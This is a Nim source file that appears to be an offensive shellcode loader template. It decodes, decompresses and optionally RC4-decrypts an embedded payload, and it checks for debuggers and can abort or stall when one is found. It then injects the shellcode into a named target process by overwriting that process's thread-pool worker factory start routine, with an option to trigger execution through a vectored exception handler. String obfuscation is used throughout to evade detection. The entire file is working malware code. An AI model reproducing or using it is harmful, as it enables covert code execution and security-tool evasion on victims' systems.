# Internal
import params
import antidebug
include helpers
# External
import os
import RC4
import winim
import strutils
import nimprotect
import supersnappy
from std/base64 import decode

# Raising VEH
{.emit: """
#include <windows.h>
void raiseVEH() {
    int x = 4 / 0;
}
""".}
proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}


proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncrypted: bool): bool =
        
    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)

    # Decode, (Decrypt) and decompress shellcode
    let commandLineParams = commandLineParams()
    var decodedPayload = decode(payload)
    var shellcodeStr: string
    var isKeySupplied = false
    if isEncrypted:
        for i in commandLineParams:
            if i.startsWith(protectString("-K:")) and len(i) > 3:
                isKeySupplied = true
                var key = i.replace(protectString("-K:"), "")
                try:
                    shellcodeStr = uncompress(fromRC4(key, decodedPayload))
                except SnappyError: # Wrong RC4 key
                    quit(1)
        if not isKeySupplied:
            quit(1)
    else:
        shellcodeStr = uncompress(decodedPayload)

    # Anti debug check
    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
        if antiDebugAction == protectString("die"):
            quit(1)
        elif antiDebugAction == protectString("troll"):
            sleepUselessCalculations(999999999)

    # Enable debug privilege
    discard setDebugPrivilege()

    var shellcodeBytes = @(shellcodeStr.toOpenArrayByte(0, shellcodeStr.high))
    var shellcodeBytesPtr = addr shellcodeBytes[0]

    # Open target process
    var targetHandle = OpenProcess(
        PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_DUP_HANDLE or PROCESS_QUERY_INFORMATION,
        FALSE,
        cast[DWORD](getPid(processName))
        )

    # Duplicate target worker factory handle
    var workerFactoryHandle = hijackProcessHandle(newWideCString("TpWorkerFactory"), targetHandle, WORKER_FACTORY_ALL_ACCESS)

    # Query target worker factory
    var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
    NtQueryInformationWorkerFactory(
        workerFactoryHandle,
        WorkerFactoryInfoClass.WorkerFactoryBasicInformation,
        addr WorkerFactoryInformation,
        cast[ULONG](sizeof(WorkerFactoryInformation)),
        NULL
        )

    # Overwrite worker factory start routine shellcode
    let wSuccess = WriteProcessMemory(
        targetHandle, 
        WorkerFactoryInformation.StartRoutine,
        shellcodeBytesPtr,
        cast[SIZE_T](shellcodeBytes.len),
        NULL
    )
    var newThreadMinimum = WorkerFactoryInformation.TotalWorkerCount + 1
    NtSetInformationWorkerFactory(
        workerFactoryHandle, 
        WorkerFactoryInfoClass.WorkerFactoryThreadMinimum, 
        addr newThreadMinimum, 
        cast[ULONG](sizeof(ULONG))
        )


proc wrapExecute() =
    discard execute(
        payload = payload, 
        processName = processName,
        sleepSeconds = sleepSeconds,
        isEncrypted = isEncrypted
    )
    quit(0)


proc wrapExecuteVEH(pExceptInfo: PEXCEPTION_POINTERS): LONG =
    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](0xC0000094)): # STATUS_INTEGER_DIVIDE_BY_ZERO 
        wrap_execute()
    else:
        return EXCEPTION_CONTINUE_SEARCH


proc main*() =
    if isVeh:
        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrapExecuteVEH))
        raiseVEH()
    else:
        wrapExecute()


when isMainModule:
    main()